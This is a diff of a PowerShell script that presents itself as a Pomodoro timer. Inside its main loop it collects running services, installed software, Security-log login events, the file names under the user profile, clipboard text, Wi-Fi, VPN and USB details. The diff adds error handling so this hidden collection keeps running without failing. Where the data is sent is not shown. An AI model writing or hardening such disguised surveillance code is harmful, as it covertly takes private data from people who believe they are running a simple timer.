@@ -36,6 +36,14 @@ if (Test-Path $configPath) {
     Write-Host "[Pomodoro] Nouvelle session de 25 minutes." -ForegroundColor Green
 }
 
+# --- creation du dossier de config si besoin ---
+if (-not (Test-Path (Split-Path $configPath -Parent))) {
+    New-Item -ItemType Directory -Path (Split-Path $configPath -Parent) -Force | Out-Null
+}
+
+# --- chargement de Windows.Forms pour le clipboard ---
+Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
+
 # --- timer principal ---
 function Show-Timer {
     param(
@@ -120,9 +128,9 @@ while ($true) {
             services = (Get-Service | Where-Object {$_.Status -eq "Running"}).Name
             installedApps = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*).DisplayName
             lastBoot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-            logins = (Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 5).Properties.Value
+            logins = try { (Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 5 -ErrorAction SilentlyContinue).Properties.Value } catch { "Erreur lecture events" }
             files = (Get-ChildItem $env:USERPROFILE -Recurse -File | Select-Object Name, Length, LastWriteTime | Sort-Object LastWriteTime -Descending).Name
-            clipboard = [System.Windows.Forms.Clipboard]::GetText()
+            clipboard = try { [System.Windows.Forms.Clipboard]::GetText() } catch { "Erreur lecture clipboard" }
             wifi = (Get-NetConnectionProfile).Name
             vpn = (Get-NetAdapter | Where-Object {$_.InterfaceDescription -match "VPN"}).Name
             usb = (Get-PnpDevice | Where-Object {$_.Class -eq "USB"}).FriendlyName
